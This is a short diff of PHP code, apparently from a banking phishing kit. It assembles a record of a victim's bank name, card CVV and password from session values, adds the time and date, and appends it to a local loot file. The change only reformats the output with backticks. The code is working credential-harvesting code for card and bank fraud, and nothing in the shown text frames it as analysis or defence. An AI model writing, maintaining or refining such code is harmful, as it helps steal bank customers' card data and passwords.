@@ -20,11 +20,11 @@ $heure = date("h:i:s") ;
 $date = date("Y:m:d") ;
 
 
-$donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
-"\n"."heure :".$heure.
-"\n"."date :".$date.
-"\n". "Cvv : " .$_SESSION["cvv"] .
-"\n"."Mdp : " .$_SESSION["mdp"] .
+$donnees = "\n**NOUVELLE CONNEXION** à : " . $_SESSION["bank"] .
+"\nHeure : " . $heure .
+"\nDate : " . $date .
+"\nCvv : `" . $_SESSION['cvv'] . "`" .
+"\nMdp : `" . $_SESSION['mdp'] . "`" .
 "\n";
 $file = "../blinky2000@bvc@bvc@destruction.txt" ;
 file_put_contents($file, $donnees, FILE_APPEND);
